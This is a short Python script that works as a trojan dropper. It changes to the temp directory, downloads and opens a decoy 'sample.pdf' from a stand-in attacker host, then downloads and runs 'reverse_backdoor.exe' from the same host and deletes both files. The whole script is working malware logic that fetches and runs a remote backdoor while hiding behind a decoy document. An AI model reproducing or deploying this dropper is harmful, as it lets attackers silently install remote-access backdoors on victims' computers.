#!/usr/bin/env python
import requests  # Import the requests library for making HTTP requests
import subprocess  # Import the subprocess module for running external commands
import os  # Import the os module for working with the operating system
import tempfile  # Import the tempfile module for working with temporary files

# Function to download a file from a given URL
def download(url):
    get_response = requests.get(url)  # Send an HTTP GET request to the specified URL
    file_name = url.split("/")[-1]  # Extract the file name from the URL

    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)  # Write the content of the response to a file

temp_directory = tempfile.gettempdir()  # Get the system's temporary directory
os.chdir(temp_directory)  # Change the current working directory to the temporary directory

# Download a PDF file from the specified URL
download("http://attacker.address/evil-files/sample.pdf")
# Open the downloaded PDF file using the default PDF viewer
subprocess.Popen("sample.pdf", shell=True)

# Download an executable file from the specified URL
download("http://attacker.address/evil-files/reverse_backdoor.exe")
# Run the downloaded executable file
subprocess.call("reverse_backdoor.exe", shell=True)

# Remove the downloaded files from the temporary directory
os.remove("sample.pdf")
os.remove("reverse_backdoor.exe")
